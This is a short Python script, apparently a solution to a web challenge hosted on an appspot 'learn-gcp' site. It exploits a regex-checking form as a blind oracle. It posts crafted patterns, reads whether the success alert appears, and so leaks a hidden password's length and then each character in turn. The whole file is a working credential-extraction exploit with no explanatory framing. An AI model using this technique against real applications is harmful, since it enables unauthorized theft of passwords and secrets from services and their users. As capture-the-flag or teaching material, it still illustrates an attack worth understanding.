import requests

url = 'https://learn-gcp-286602.uc.r.appspot.com/'
data = {'regexCheck': ''}

success = '<div class="alert alert-success" role="alert">'

def find_regex(regex):
    data['regexCheck'] = regex
    x = requests.post(url, data = data)
    return x.text.find(success)

l = 1

#print('leaking password length...')
while True:
    if find_regex('.{%d}' % l) == -1:
        l -= 1
        break
    
    l += 1

#print("password length is %d" % l)

password = '.'*l

for i in range(l):
    print(password)
    sub = password[:i] + '\d' + password[i+1:]
    if find_regex(sub) != -1:
        for j in range(10):
            sub = password[:i] + str(j) + password[i+1:]
            if find_regex(sub) != -1:
                password = sub
                break
        continue

    sub = password[:i] + '[a-z]' + password[i+1:]
    if find_regex(sub) != -1:
        for j in 'abcdefghijklmnopqrstuvwxyz':
            sub = password[:i] + j + password[i+1:]
            if find_regex(sub) != -1:
                password = sub
                break
        continue

    # they are separated to reduce request time
    sub = password[:i] + '[A-Z]' + password[i+1:]
    if find_regex(sub) != -1:
        for j in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            sub = password[:i] + j + password[i+1:]
            if find_regex(sub) != -1:
                password = sub
                break
        continue
    
    for j in ['_', '-', '!']:
        sub = password[:i] + j + password[i+1:]
        if find_regex(sub) != -1:
            password = sub
            break

print(password) 

